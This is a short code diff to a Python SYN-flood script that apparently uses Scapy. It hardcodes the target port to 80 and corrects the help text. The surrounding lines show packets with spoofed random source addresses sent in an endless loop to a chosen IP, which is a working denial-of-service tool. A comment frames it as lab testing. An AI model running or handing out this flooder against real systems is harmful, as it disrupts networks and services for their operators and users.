@@ -7,7 +7,6 @@ def main():
     # Specify the command line Arguments
     parser = ArgumentParser()
     parser.add_argument('--target-ip', '-t', help='Target IP address')
-    parser.add_argument('--target-port', '-p', help='Target Port')
     parser.epilog = "Usage: python syn_flooding.py -t <IP Address>"        
     args = parser.parse_args()
     
@@ -17,7 +16,7 @@ def main():
         
         target_ip = args.target_ip # target IP address (should be a testing router/firewall)
         
-        target_port = args.target_port # the target port u want to flood
+        target_port = 80 # the target port u want to flood
         
         ip = IP(src=RandIP("172.0.0.1/24"), dst=target_ip) # forge IP packet with source IP Spoofing and target ip as the destination IP address
         
@@ -32,8 +31,8 @@ def main():
         send(p, loop=1, verbose=0) # send the constructed packet in a loop until CTRL+C is detected
         
     else:
-        print('[-]Please, use --target-ip or -tg to set a Target IP Address!')
-        print('[!]Example: -tg 10.20.30.40')
+        print('[-]Please, use --target-ip or -t to set a Target IP Address!')
+        print('[!]Example: -t 10.20.30.40')
         print('[?] -h for help')
         exit()
 
